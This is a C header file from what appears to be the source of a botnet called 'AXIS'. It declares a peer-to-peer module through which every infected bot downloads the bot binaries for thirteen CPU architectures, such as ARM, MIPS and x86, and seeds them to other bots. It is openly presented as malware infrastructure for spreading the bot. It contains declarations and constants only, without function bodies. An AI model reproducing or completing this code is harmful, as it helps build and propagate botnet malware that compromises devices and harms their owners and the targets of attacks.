/*
 * AXIS P2P File Sharing - Torrent-style seeding
 * Every bot is both a seeder and a leecher
 * Downloads ALL bot binaries and serves them to peers
 */

#ifndef _P2PFILE_H
#define _P2PFILE_H

#define P2PFILE_PORT 49153
#define CHUNK_SIZE 4096

#define P2PFILE_REQ 0x20
#define P2PFILE_DATA 0x21

/* Bot architecture names - must match binary filenames */
#define BOT_ARCH_COUNT 13
static const char *bot_archs[BOT_ARCH_COUNT] = {
    "arm", "arm5", "arm6", "arm7",
    "mips", "mpsl",
    "x86", "x86_64",
    "ppc", "spc",
    "m68k", "sh4", "arc"
};

/* Torrent-style state */
typedef struct {
    char arch[32];
    uint8_t *data;
    uint32_t size;
    uint32_t chunk_count;
    int is_seeder;  /* 1 = we have this binary and serve it */
} bot_binary_t;

void p2pfile_init(void);
void p2pfile_start(void);

/* Download a binary from the P2P network (torrent-style from any peer) */
int p2pfile_download(const char *arch, ipv4_t seed_addr, port_t seed_port);

/* Download ALL bot binaries from peers (called on first boot) */
int p2pfile_download_all(ipv4_t seed_addr, port_t seed_port);

/* Serve binaries to requesting peers (every bot is a seeder) */
void p2pfile_handle_request(struct sockaddr_in *from, uint8_t *buf, int len, int listen_fd);

/* Check if we have a binary loaded and ready to serve */
int p2pfile_has_binary(const char *arch);

/* Get count of binaries we are currently seeding */
int p2pfile_seeder_count(void);

#endif
